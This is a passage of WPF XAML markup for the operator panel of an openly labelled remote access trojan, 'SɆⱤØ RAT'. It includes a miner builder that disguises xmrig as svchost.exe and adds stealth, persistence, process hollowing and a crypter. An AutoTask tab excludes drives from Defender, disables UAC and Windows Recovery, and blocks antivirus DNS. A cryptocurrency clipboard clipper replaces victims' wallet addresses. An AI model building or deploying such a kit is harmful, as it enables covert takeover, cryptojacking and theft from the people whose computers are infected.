                                </Border>

                                <!-- CPU TUNING card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="CPU TUNING" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <Grid Margin="0,0,0,6">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="8"/>
                                                <ColumnDefinition Width="*"/>
                                            </Grid.ColumnDefinitions>
                                            <StackPanel>
                                                <TextBlock Text="CPU% IDLE" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrCpuIdle" Style="{StaticResource STxt}" Text="75"
                                                         ToolTip="CPU % when user is idle"/>
                                            </StackPanel>
                                            <StackPanel Grid.Column="2">
                                                <TextBlock Text="CPU% ACTIVE" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrCpuActive" Style="{StaticResource STxt}" Text="0"
                                                         ToolTip="0 = no cap when user is active"/>
                                            </StackPanel>
                                        </Grid>
                                        <StackPanel>
                                            <TextBlock Text="IDLE AFTER (sec)" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldMnrIdleSec" Style="{StaticResource STxt}" Text="30"/>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>
                                    </StackPanel>
                                    <StackPanel Grid.Column="2" VerticalAlignment="Top">

                                <!-- DEPLOY card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="DEPLOY" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="INSTALL NAME" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrInstallName" Style="{StaticResource STxt}"
                                                 Text="svchost.exe" Margin="0,0,0,6"
                                                 ToolTip="Filename used when xmrig is written to AppData"/>
                                        <CheckBox x:Name="BldMnrStealth" Content="Stealth process (taskmgr, procexp, sysinformer, process hacker)"
                                                  Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Pause/kill miner when a process monitor is detected"/>
                                        <!-- Centralized stats server URL -->
                                        <TextBlock Text="STATS SERVER URL" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Click Launch to start stats-server — URL is auto-filled. Or paste manually: http://your-ip:8080/api/report"/>
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="4"/>
                                                <ColumnDefinition Width="Auto"/>
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldMnrStatsUrl" Grid.Column="0" Style="{StaticResource STxt}" Text=""
                                                     ToolTip="Auto-filled when you click Launch, or paste: http://your-ip:8080/api/report"/>
                                            <Button Grid.Column="2" Content="Launch" Padding="8,3"
                                                    ToolTip="Start stats-server (if not running), fill URL, open browser"
                                                    Click="BldMnrStatsLaunch_Click"
                                                    Style="{StaticResource SBtn}"/>
                                        </Grid>
                                        <TextBlock Text="STATS TOKEN" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Secret key — only miners with this token can post stats. Required when server is public."/>
                                        <TextBox x:Name="BldMnrStatsToken" Style="{StaticResource STxt}" Text=""
                                                 ToolTip="Token set in start_stats.bat (default: sero123). Must match the server token."/>
                                        <TextBlock Margin="0,4,0,0" FontSize="10" Foreground="#60A0FF" FontFamily="Consolas"
                                                   TextWrapping="Wrap"
                                                   Text="Run stats-server.exe → paste URL above → Open. All miners appear in one page."/>
                                    </StackPanel>
                                </Border>

                                <!-- PROTECTION card -->
                                <Border Margin="0,0,0,14" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldMnrDisableSleep" Content="Disable sleep (keep system awake)"
                                                  Style="{StaticResource SChk}" IsChecked="True"/>
                                        <CheckBox x:Name="BldMnrStartup" Content="Persist via scheduled task"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                        <CheckBox x:Name="BldMnrSafeBoot" Content="SafeBoot persistence (service + registry)"
                                                  Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Installs stub as auto-start service and registers in SafeBoot registry keys — survives Safe Mode reboots"/>
                                        <CheckBox x:Name="BldMnrWatchdog" Content="Anti-Kill + Watchdog (DACL + auto-restart)"
                                                  Style="{StaticResource SChk}" IsChecked="True"/>
                                        <CheckBox x:Name="BldMnrBotKiller" Content="BotKiller (kill competing miners)"
                                                  Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Scans every 30s and kills known CPU/GPU miners. Clears critical-process flag before killing to avoid BSOD."/>
                                        <CheckBox x:Name="BldMnrHollow" Content="Process Hollowing"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                        <StackPanel Margin="0,2,0,6"
                                                    Visibility="{Binding IsChecked, ElementName=BldMnrHollow, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="HOLLOW TARGET" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldMnrHollowTarget" Style="{StaticResource STxt}" Text="svchost.exe"/>
                                        </StackPanel>
                                        <CheckBox x:Name="BldMnrEncrypt" Content="Crypter (AES-256, loader, polymorphic)"
                                                  Style="{StaticResource SChk}" IsChecked="False"/>
                                    </StackPanel>
                                </Border>

                                <!-- BUILD card -->
                                <Border Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="BUILD" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <StackPanel Orientation="Horizontal">
                                            <Button x:Name="BtnMnrBuild" Content="BUILD" Width="120" Height="30"
                                                    Style="{StaticResource SGreenBtn}" Click="BldMnrBuild_Click"/>
                                            <Button Content="WEB PANEL" Width="100" Height="30" Margin="8,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrStatsLaunch_Click"
                                                    ToolTip="Start stats-server (if not running) and open the web dashboard in the browser"/>
                                            <Button Content="SAVE CONFIG" Width="100" Height="30" Margin="8,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrSaveConfig_Click"/>
                                            <Button Content="LOAD CONFIG" Width="100" Height="30" Margin="6,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldMnrLoadConfig_Click"/>
                                        </StackPanel>
                                        <TextBlock x:Name="TxtMnrBuildStatus" Text="" Foreground="#606880"
                                                   FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,8,0,0"/>
                                    </StackPanel>
                                </Border>

                                    </StackPanel>
                            </Grid>
                            </ScrollViewer>

                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── AutoTask ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="▷" Foreground="#F59E0B" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="AutoTask"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="20" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto" />
                                <RowDefinition Height="*" />
                            </Grid.RowDefinitions>

                            <StackPanel Margin="0,0,0,14">
                                <WrapPanel HorizontalAlignment="Center" Margin="0,0,0,8">
                                    <Button Content="ADD FILE"     Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_AddFile_Click" />
                                    <Button Content="EXCLUDE C:"   Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_ExcludeCDrive_Click"
                                            ToolTip="Exclude C:\ from Defender via C++ DLL plugin (SYSTEM token, WMI)." />
                                    <Button Content="DISABLE UAC"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_DisableUAC_Click" />
                                    <Button Content="BLOCK AV DNS" Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockAvDomains_Click" />
                                    <Button Content="BLOCK RESET"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockReset_Click"
                                            ToolTip="Disable Windows Recovery (reagentc /disable)" />
                                    <Button Content="BOTKILLER"    Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BotKiller_Click"
                                            ToolTip="Kill known RATs/miners, remove their persistence from Run keys and startup folder." />
                                    <Button Content="REMOVE"       Height="30" Margin="4" Style="{StaticResource SBtn}"      Click="AutoTask_Remove_Click" />
                                </WrapPanel>
                                <TextBlock Text="Tasks execute once per HWID"
                                           Foreground="#606880" FontSize="11"
                                           HorizontalAlignment="Center" />
                            </StackPanel>

                            <DataGrid x:Name="GridAutoTasks" Grid.Row="1"
                                      AutoGenerateColumns="False" IsReadOnly="True"
                                      Background="Transparent" Foreground="#DDE0F0"
                                      BorderThickness="0" RowBackground="Transparent"
                                      AlternatingRowBackground="#07101428"
                                      GridLinesVisibility="None" HeadersVisibility="Column"
                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
                                      ColumnHeaderStyle="{StaticResource SColHeader}">
                                <DataGrid.Columns>
                                    <DataGridTextColumn Header="NAME"       Binding="{Binding FileName}"                                Width="*"   />
                                    <DataGridTextColumn Header="TYPE"       Binding="{Binding TypeDisplay}"                             Width="110" />
                                    <DataGridTextColumn Header="SIZE"       Binding="{Binding SizeDisplay}"                             Width="90"  />
                                    <DataGridTextColumn Header="EXECUTIONS" Binding="{Binding ExecutionCount}"                          Width="100" />
                                    <DataGridTextColumn Header="ADDED"      Binding="{Binding AddedAt, StringFormat=yyyy-MM-dd HH:mm}" Width="140" />
                                </DataGrid.Columns>
                            </DataGrid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── Settings ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="⚙" Foreground="#606880" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Settings"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="32" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <StackPanel MaxWidth="520" HorizontalAlignment="Center">
                            <TextBlock Text="SERVER LIMITS" Style="{StaticResource SLabel}" />
                            <TextBlock Text="MAX CONNECTED CLIENTS" Style="{StaticResource SFieldLabel}" />
                            <TextBox x:Name="SettingsMaxClients" Style="{StaticResource STxt}" Text="1000" Width="120" HorizontalAlignment="Left" Margin="0,0,0,6" />
                            <TextBlock Text="Rejects new connections when this limit is reached." Foreground="#606880" FontSize="11" Margin="0,0,0,24" />

                            <TextBlock Text="INTEGRATIONS" Style="{StaticResource SLabel}" />
                            <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence" Style="{StaticResource SChk}" Margin="0,0,0,24" />

                            <TextBlock Text="PORT CHECKER" Style="{StaticResource SLabel}" />
                            <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
                                <TextBox x:Name="SettingsCheckIP"   Style="{StaticResource STxt}" Width="160" Text="127.0.0.1" />
                                <TextBlock Text=":" Foreground="#606880" FontSize="16" VerticalAlignment="Center" Margin="8,0" />
                                <TextBox x:Name="SettingsCheckPort" Style="{StaticResource STxt}" Width="64" Text="7777" />
                                <Button Content="CHECK" Height="32" Margin="10,0,0,0" Style="{StaticResource SGreenBtn}" Click="CheckPort_Click" />
                                <Button Content="GET IP" Height="32" Margin="8,0,0,0"  Style="{StaticResource SBtn}"      Click="GetMyIP_Click" />
                            </StackPanel>
                            <TextBlock x:Name="TxtPortResult" Text="" Foreground="#606880" FontSize="12" Margin="0,4,0,24" />

                            <Button Content="APPLY" Height="32" Width="100" Style="{StaticResource SGreenBtn}" Click="SettingsApply_Click" HorizontalAlignment="Left" />
                        </StackPanel>
                    </Border>
                </TabItem>

                <!-- ── Logs ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="≋" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Logs"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="12" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <ScrollViewer x:Name="LogScroller" VerticalScrollBarVisibility="Auto">
                            <TextBlock x:Name="TxtLogs" Foreground="#606880"
                                       FontFamily="Consolas" FontSize="11" TextWrapping="Wrap" />
                        </ScrollViewer>
                    </Border>
                </TabItem>

                <!-- ── About ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="✦" Foreground="#7C5CE8" FontSize="10" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="About"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <ScrollViewer VerticalScrollBarVisibility="Auto"
                                      HorizontalScrollBarVisibility="Disabled">
                            <StackPanel HorizontalAlignment="Center"
                                        Margin="20,28,20,28">

                                <!-- Developer photo -->
                                <Grid HorizontalAlignment="Center" Margin="0,0,0,18">
                                    <Ellipse Width="168" Height="168" HorizontalAlignment="Center" VerticalAlignment="Center">
                                        <Ellipse.Fill>
                                            <RadialGradientBrush>
                                                <GradientStop Color="#304A85F5" Offset="0.6"/>
                                                <GradientStop Color="Transparent" Offset="1"/>
                                            </RadialGradientBrush>
                                        </Ellipse.Fill>
                                    </Ellipse>
                                    <Border Width="150" Height="150" CornerRadius="75"
                                            BorderThickness="3" HorizontalAlignment="Center" VerticalAlignment="Center">
                                        <Border.BorderBrush>
                                            <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                                <GradientStop Color="#4A85F5" Offset="0"/>
                                                <GradientStop Color="#C44BFF" Offset="0.5"/>
                                                <GradientStop Color="#7C5CE8" Offset="1"/>
                                            </LinearGradientBrush>
                                        </Border.BorderBrush>
                                        <Border.Background>
                                            <ImageBrush ImageSource="/photo.png"
                                                        Stretch="UniformToFill"
                                                        AlignmentX="Center" AlignmentY="Top"
                                                        RenderOptions.BitmapScalingMode="HighQuality"/>
                                        </Border.Background>
                                        <Border.Clip>
                                            <EllipseGeometry Center="75,75" RadiusX="75" RadiusY="75"/>
                                        </Border.Clip>
                                    </Border>
                                </Grid>

                                <!-- Title -->
                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,0,0,4">
                                    <TextBlock VerticalAlignment="Center" FontSize="24" FontWeight="Bold">
                                        <Run Text="SɆⱤØ">
                                            <Run.Foreground>
                                                <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                                    <GradientStop Color="#4A85F5" Offset="0"/>
                                                    <GradientStop Color="#7C5CE8" Offset="1"/>
                                                </LinearGradientBrush>
                                            </Run.Foreground>
                                        </Run>
                                        <Run Text="RAT">
                                            <Run.Foreground>
                                                <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                                    <GradientStop Color="#D8DCF0" Offset="0"/>
                                                    <GradientStop Color="#8890B8" Offset="0.5"/>
                                                    <GradientStop Color="#C4C8E0" Offset="1"/>
                                                </LinearGradientBrush>
                                            </Run.Foreground>
                                        </Run>
                                    </TextBlock>
                                </StackPanel>

                                <TextBlock HorizontalAlignment="Center" Margin="0,0,0,20"
                                           FontSize="11" FontWeight="SemiBold">
                                    <TextBlock.Foreground>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="#7A8AB8" Offset="0"/>
                                            <GradientStop Color="#9AABCC" Offset="0.5"/>
                                            <GradientStop Color="#7A8AB8" Offset="1"/>
                                        </LinearGradientBrush>
                                    </TextBlock.Foreground>
                                    REMOTE ACCESS TROJAN
                                </TextBlock>

                                <!-- Divider -->
                                <Rectangle Height="1" MaxWidth="320" HorizontalAlignment="Center" Margin="0,0,0,18">
                                    <Rectangle.Fill>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="Transparent" Offset="0"/>
                                            <GradientStop Color="#3A4080"     Offset="0.5"/>
                                            <GradientStop Color="Transparent" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Rectangle.Fill>
                                </Rectangle>

                                <!-- Description -->
                                <StackPanel HorizontalAlignment="Center" Margin="0,0,0,22" MaxWidth="360">
                                    <TextBlock TextAlignment="Center" HorizontalAlignment="Center"
                                               FontSize="13" FontStyle="Italic" Foreground="#A8B0CC" Margin="0,0,0,5">
                                        Powerful lightweight and polymorphic x64 RAT
                                    </TextBlock>
                                    <TextBlock TextAlignment="Center" HorizontalAlignment="Center"
                                               FontSize="11" Foreground="#5A6080" Margin="0,0,0,12">
                                        Crafted by Serotonine, Cool French Developer
                                    </TextBlock>
                                    <TextBlock TextAlignment="Center" HorizontalAlignment="Center"
                                               FontSize="11" FontWeight="Bold" Foreground="#BCC4E0" Margin="0,0,0,12">
                                        I'm not responsible for any misuse of this tool
                                    </TextBlock>

                                    <!-- 2-column feature grid — half the vertical space -->
                                    <Border CornerRadius="8" Padding="18,10" HorizontalAlignment="Center" BorderThickness="1">
                                        <Border.BorderBrush>
                                            <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                                <GradientStop Color="#30404A85" Offset="0"/>
                                                <GradientStop Color="#307C5CE8" Offset="1"/>
                                            </LinearGradientBrush>
                                        </Border.BorderBrush>
                                        <Border.Background>
                                            <SolidColorBrush Color="#060810"/>
                                        </Border.Background>
                                        <UniformGrid Columns="2">
                                            <TextBlock Text="▸  Remote Shell"      Foreground="#8890B0" FontSize="11" Margin="0,3,14,3"/>
                                            <TextBlock Text="▸  Remote Desktop"    Foreground="#8890B0" FontSize="11" Margin="0,3,0,3"/>
                                            <TextBlock Text="▸  Remote Webcam"     Foreground="#8890B0" FontSize="11" Margin="0,3,14,3"/>
                                            <TextBlock Text="▸  File Execution"    Foreground="#8890B0" FontSize="11" Margin="0,3,0,3"/>
                                            <TextBlock Text="▸  Update Client"     Foreground="#8890B0" FontSize="11" Margin="0,3,14,3"/>
                                            <TextBlock Text="▸  Uninstall Client"  Foreground="#8890B0" FontSize="11" Margin="0,3,0,3"/>
                                            <TextBlock Text="▸  UAC Elevation"     Foreground="#8890B0" FontSize="11" Margin="0,3,14,3"/>
                                            <TextBlock Text="▸  UAC Loop"          Foreground="#8890B0" FontSize="11" Margin="0,3,0,3"/>
                                            <TextBlock Text="▸  AutoTask"          Foreground="#8890B0" FontSize="11" Margin="0,3,14,3"/>
                                            <TextBlock Text="▸  And more…"         Foreground="#5A6080" FontSize="11" Margin="0,3,0,3" FontStyle="Italic"/>
                                        </UniformGrid>
                                    </Border>
                                </StackPanel>

                                <!-- Telegram badge -->
                                <StackPanel HorizontalAlignment="Center" Margin="0,18,0,0">
                                    <TextBlock Text="C  O  N  T  A  C  T" HorizontalAlignment="Center"
                                               FontSize="12" FontWeight="SemiBold" Foreground="#303560"
                                               Margin="0,0,0,10"/>
                                    <Button HorizontalAlignment="Center" Cursor="Hand"
                                            Click="TelegramLink_Click"
                                            Background="Transparent" BorderThickness="0" Padding="0">
                                        <Button.Template>
                                            <ControlTemplate TargetType="Button">
                                                <Border x:Name="TgBorder" CornerRadius="14" Padding="28,15"
                                                        BorderThickness="1">
                                                    <Border.Background>
                                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                                            <GradientStop Color="#0A1428" Offset="0"/>
                                                            <GradientStop Color="#0D1A38" Offset="1"/>
                                                        </LinearGradientBrush>
                                                    </Border.Background>
                                                    <Border.BorderBrush>
                                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                                            <GradientStop Color="#702CA5E0" Offset="0"/>
                                                            <GradientStop Color="#704A85F5" Offset="1"/>
                                                        </LinearGradientBrush>
                                                    </Border.BorderBrush>
                                                    <Border.Effect>
                                                        <DropShadowEffect Color="#2CA5E0" BlurRadius="22"
                                                                          ShadowDepth="0" Opacity="0.30"/>
                                                    </Border.Effect>
                                                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                        <Image Source="/telegram.png" Width="24" Height="24"
                                                               VerticalAlignment="Center" Margin="0,0,12,0"
                                                               RenderOptions.BitmapScalingMode="HighQuality"/>
                                                        <StackPanel VerticalAlignment="Center">
                                                            <TextBlock Text="@serotohnine" Foreground="#7AABFF"
                                                                       FontSize="14" FontWeight="SemiBold"/>
                                                        </StackPanel>
                                                    </StackPanel>
                                                </Border>
                                                <ControlTemplate.Triggers>
                                                    <Trigger Property="IsMouseOver" Value="True">
                                                        <Setter TargetName="TgBorder" Property="Opacity" Value="0.78"/>
                                                    </Trigger>
                                                    <Trigger Property="IsPressed" Value="True">
                                                        <Setter TargetName="TgBorder" Property="Opacity" Value="0.50"/>
                                                    </Trigger>
                                                </ControlTemplate.Triggers>
                                            </ControlTemplate>
                                        </Button.Template>
                                    </Button>
                                </StackPanel>

                            </StackPanel>
                        </ScrollViewer>
                    </Border>
                </TabItem>

                <!-- ── Crypto Clipper ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <Image Source="/Resources/crypto/btc.png" Width="14" Height="14"
                                   Margin="0,0,5,0" VerticalAlignment="Center"
                                   RenderOptions.BitmapScalingMode="HighQuality"/>
                            <TextBlock Text="Clipper"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8" Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <!-- Subtle ₿ watermark -->
                            <TextBlock Text="₿" FontSize="320" FontWeight="Bold" Opacity="0.018"
                                       HorizontalAlignment="Center" VerticalAlignment="Center"
                                       Foreground="#F7931A" IsHitTestVisible="False"
                                       FontFamily="Segoe UI" Margin="0,40,0,0"/>

                            <DockPanel Margin="14,12,14,12" LastChildFill="True">

                                <!-- Header bar with market-ticker style -->
                                <Border DockPanel.Dock="Top" Margin="0,0,0,10" Padding="14,10" CornerRadius="6"
                                        BorderThickness="1">
                                    <Border.Background>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="#0D0E1A" Offset="0"/>
                                            <GradientStop Color="#0A0C14" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.Background>
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                            <GradientStop Color="#2A2010" Offset="0"/>
                                            <GradientStop Color="#1A1828" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                    <Grid>
                                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                            <!-- Bitcoin logo -->
                                            <Image Source="/Resources/crypto/btc.png" Width="28" Height="28"
                                                   Margin="0,0,10,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                            <StackPanel VerticalAlignment="Center">
                                                <TextBlock Text="CRYPTO CLIPPER" FontSize="10" FontWeight="Bold"
                                                           FontFamily="Consolas" Foreground="#C8A060"/>
                                                <TextBlock Text="clipboard address interceptor" FontSize="9"
                                                           Foreground="#404060" FontFamily="Consolas"/>
                                            </StackPanel>
                                            <Border x:Name="ClipperActiveBadge" Margin="12,0,0,0" CornerRadius="3"
                                                    Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
                                                    Padding="8,3" Visibility="Collapsed" VerticalAlignment="Center">
                                                <StackPanel Orientation="Horizontal">
                                                    <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                                        <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="6" ShadowDepth="0" Opacity="1"/></Ellipse.Effect>
                                                    </Ellipse>
                                                    <TextBlock Text="INTERCEPTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Consolas"/>
                                                </StackPanel>
                                            </Border>
                                            <TextBlock x:Name="ClipperCountTxt" Text=""
                                                       Foreground="#404868" FontSize="11" FontFamily="Consolas"
                                                       VerticalAlignment="Center" Margin="14,0,0,0"/>
                                        </StackPanel>
                                        <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                                            <Button x:Name="BtnClipperStart" Content="START" Height="30" Padding="14,0"
                                                    Margin="0,0,6,0" Style="{StaticResource SGreenBtn}"
                                                    Click="ClipperStart_Click"
                                                    ToolTip="Enable clipper and push to all connected clients"/>
                                            <Button x:Name="BtnClipperStop" Content="STOP" Width="68" Height="30"
                                                    Style="{StaticResource SRedBtn}" IsEnabled="False" Opacity="0.4"
                                                    Click="ClipperStop_Click"
                                                    ToolTip="Disable clipper on all connected clients"/>
                                        </StackPanel>
                                    </Grid>
                                </Border>

                                <!-- Detection log at bottom -->
                                <Border DockPanel.Dock="Bottom" Margin="0,10,0,0" CornerRadius="6"
                                        Background="#070810" BorderThickness="1" BorderBrush="#12142A">
                                    <DockPanel>
                                        <Grid DockPanel.Dock="Top" Margin="12,8,12,6">
                                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                <TextBlock Text="●" FontSize="7" Foreground="#22C55E" VerticalAlignment="Center" Margin="0,0,6,0"/>
                                                <TextBlock Text="INTERCEPT LOG" FontSize="9" FontWeight="Bold"
                                                           Foreground="#1A5E28" FontFamily="Consolas" VerticalAlignment="Center"/>
                                            </StackPanel>
                                            <Button Content="Clear" Height="22" Padding="10,0" HorizontalAlignment="Right"
                                                    Style="{StaticResource SBtn}" FontSize="10" Click="ClipperClearLog_Click"/>
                                        </Grid>
                                        <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto"
                                                      Height="100" DockPanel.Dock="Top" Margin="0,0,0,8">
                                            <TextBox x:Name="ClipperLog"
                                                     Background="Transparent" Foreground="#4AE870"
                                                     FontFamily="Consolas" FontSize="11"
                                                     BorderThickness="0" Padding="12,4"
                                                     IsReadOnly="True" TextWrapping="Wrap"
                                                     AcceptsReturn="True"/>
                                        </ScrollViewer>
                                    </DockPanel>
                                </Border>

                                <!-- Address grid — fills remaining space -->
                                <Border CornerRadius="6" Padding="14,12" BorderThickness="1" BorderBrush="#16182A"
                                        Background="#08090F">
                                    <Grid>
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="*"/>
                                            <ColumnDefinition Width="16"/>
                                            <ColumnDefinition Width="*"/>
                                        </Grid.ColumnDefinitions>
                                        <!-- Left column -->
                                        <StackPanel Grid.Column="0">
                                            <TextBlock Text="DESTINATION ADDRESSES" FontSize="9" FontWeight="Bold"
                                                       Foreground="#604820" FontFamily="Consolas" Margin="0,0,0,10"/>
                                            <!-- BTC - orange/gold -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/btc.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="BTC" Foreground="#F7931A" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperBTC" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Bitcoin — P2PKH/P2SH/Bech32"/></Grid>
                                            <!-- ETH - blue/purple -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/eth.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
